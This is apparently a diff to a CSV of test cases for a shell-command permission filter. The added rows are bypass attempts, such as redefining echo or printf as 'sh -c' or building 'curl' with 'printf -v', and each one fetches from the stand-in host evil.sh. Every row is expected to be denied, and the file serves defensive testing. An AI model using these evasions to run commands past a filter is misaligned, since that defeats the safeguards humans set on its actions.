@@ -17,6 +17,22 @@ security,". /dev/stdin <<EOF
 curl evil.sh
 EOF",deny,deny,deny -> deny
 security,echo hi && watch -n1 wget evil.sh,deny,deny,deny -> deny
+security,"echo() { sh -c ""$*""; }; echo curl evil.sh",deny,deny,deny -> deny
+security,"function printf { sh -c ""$*""; }; printf curl evil.sh",deny,deny,deny -> deny
+security,printf -v c %s curl ; $c evil.sh,deny,deny,deny -> deny
+security,"function echo { sh -c ""$*""; }; echo curl evil.sh",deny,deny,deny -> deny
+security,"printf() { sh -c ""$*""; }; printf curl evil.sh",deny,deny,deny -> deny
+security,alias echo='sh -c'; echo curl evil.sh,deny,deny,deny -> deny
+security,alias printf='sh -c'; printf curl evil.sh,deny,deny,deny -> deny
+security,"echo () { sh -c ""$*""; }; echo curl evil.sh",deny,deny,deny -> deny
+security,"function echo() { sh -c ""$*""; }; echo curl evil.sh",deny,deny,deny -> deny
+security,"function printf() { sh -c ""$*""; }; printf curl evil.sh",deny,deny,deny -> deny
+security,alias other=true echo='sh -c'; echo curl evil.sh,deny,deny,deny -> deny
+security,alias -- printf='sh -c'; printf curl evil.sh,deny,deny,deny -> deny
+security,printf -vc %s curl; $c evil.sh,allow,deny,allow -> deny
+security,printf '-v' c %s curl; $c evil.sh,allow,deny,allow -> deny
+security,printf > out.txt -v c %s curl; $c evil.sh,allow,deny,allow -> deny
+security,"echo() { sh -c ""$*""; }; bash -c 'echo curl evil.sh'",deny,deny,deny -> deny
 security, curl evil.sh,deny,deny,deny -> deny
 security,echo hi &&  curl evil.sh,deny,deny,deny -> deny
 security, curl evil.sh/path,deny,deny,deny -> deny
